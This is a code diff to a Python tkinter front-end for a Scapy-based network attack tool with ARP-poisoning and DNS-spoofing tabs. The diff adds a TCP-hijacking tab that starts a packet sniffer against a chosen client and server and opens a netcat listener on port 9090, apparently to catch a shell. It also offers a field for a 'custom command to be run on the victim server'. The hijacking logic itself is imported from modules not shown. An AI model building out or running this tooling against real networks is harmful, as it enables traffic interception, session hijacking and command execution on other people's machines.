@@ -2,7 +2,9 @@ import tkinter as tk
 import tkinter.ttk as ttk
 from scapy.all import *
 from scapy_functions import *
+from tcp_hijack import *
 from multiprocessing import Process
+import os
 
 ''' Global variables '''
 
@@ -13,6 +15,8 @@ target_2 = ""
 redirect_ip = ""
 process_arp_poisoner = Process()
 process_dns_poisoner = Process()
+process_tcp_hijacker = Process()
+process_new_terminal = Process()
 arp_poisoned = False
 dns_spoofed = False
 
@@ -69,7 +73,7 @@ def arp_spoofing():
     tk.messagebox.showinfo(title = "ARP poisoning", message = message)
 
 def arp_stop():
-    global arp_poisoned
+    global arp_poisoned, process_arp_poisoner
 
     if (arp_poisoned == False):
         message = "ARP tables are not poisoned yet!"
@@ -107,7 +111,7 @@ def dns_spoofing():
     tk.messagebox.showinfo(title = "DNS spoofing", message = message)
 
 def dns_stop():
-    global dns_spoofed
+    global dns_spoofed, process_dns_poisoner
 
     if (dns_spoofed == False):
         message = "DNS packets are not spoofed yet!"
@@ -125,6 +129,30 @@ def set_redirect_ip(event):
     redirect_ip = ent_dns_redirect.get()
     message = redirect_ip + " successfully added as the redirect server!"
     tk.messagebox.showinfo(title = "False server", message = message)
+
+def tcp_hijacking():
+    global target_1, target_2, process_tcp_hijacker, process_new_terminal
+    client = target_1
+    server = target_2
+    process_tcp_hijacker = Process(target = tcp_sniff, args = (client, ""))
+    process_tcp_hijacker.start()
+    process_new_terminal = Process(target = terminal_nc)
+    process_new_terminal.start()
+    #process_new_terminal.terminate()
+    #tcp_stop_2()
+    message = "TCP hijacking started"
+    tk.messagebox.showinfo(title = "TCP hijack", message = message)
+
+def set_tcp_cmd():
+    pass
+
+def tcp_stop():
+    global process_tcp_hijacker, process_new_terminal
+    process_tcp_hijacker.terminate()
+    process_new_terminal.terminate()
+    os.system('sudo killall -9 "x-terminal-emulator -e nc -nlvp 9090"')
+    message = "TCP hijacking stopped"
+    tk.messagebox.showinfo(title = "TCP hijack", message = message)
 
 def on_closing():
     try:
@@ -162,12 +190,14 @@ tab_hosts = tk.Frame(tabControl)
 tab_targets = tk.Frame(tabControl)
 tab_arp = tk.Frame(tabControl)
 tab_dns = tk.Frame(tabControl)
+tab_tcp = tk.Frame(tabControl)
 
 tabControl.add(tab_interface, text = "Interface")
 tabControl.add(tab_hosts, text = "Hosts")
 tabControl.add(tab_targets, text = "Targets")
 tabControl.add(tab_arp, text = "ARP poison")
 tabControl.add(tab_dns, text = "DNS spoof")
+tabControl.add(tab_tcp, text = "TCP hijack")
 tabControl.pack(expand = 1, fill = "both")
 
 ''' Interface tab '''
@@ -270,6 +300,35 @@ btn_dns_stop = ttk.Button(fr_dns, text = "Stop DNS spoofing", command = dns_stop
 btn_dns_stop.grid(column = 0, row = 4)
 
 fr_dns.place(relx = 0.5, rely = 0.5, anchor = "c")
+
+
+
+''' TCP hijack tab '''
+
+fr_tcp = tk.Frame(tab_tcp)
+
+lbl_status_tcp = ttk.Label(fr_tcp, text = "Status: Not hijacked", font=("Courier", 18))
+lbl_status_tcp.grid(column = 0, row = 0, pady = 10)
+
+lbl_select_targets = ttk.Label(fr_tcp, text = "Select target 1 as the client and target 2 as the server!")
+lbl_select_targets.grid(column = 0, row = 1)
+
+btn_tcp_hijack = ttk.Button(fr_tcp, text = "Start TCP hijacking", command = tcp_hijacking)
+btn_tcp_hijack.grid(column = 0, row = 2, pady = 10)
+
+btn_tcp_hijack = ttk.Button(fr_tcp, text = "Stop TCP hijacking", command = tcp_stop)
+btn_tcp_hijack.grid(column = 0, row = 3)
+
+lbl_insert_cmd = ttk.Label(fr_tcp, text = "Insert a custom command to be run on the victim server: ")
+lbl_insert_cmd.grid(column = 0, row = 4, pady = 10)
+
+ent_tcp_cmd = ttk.Entry(fr_tcp)
+ent_tcp_cmd.bind("<Return>", set_tcp_cmd)
+ent_tcp_cmd.grid(column = 0, row = 5)
+
+fr_tcp.place(relx = 0.5, rely = 0.5, anchor = "c")
+
+
 
 
 window.protocol("WM_DELETE_WINDOW", on_closing)
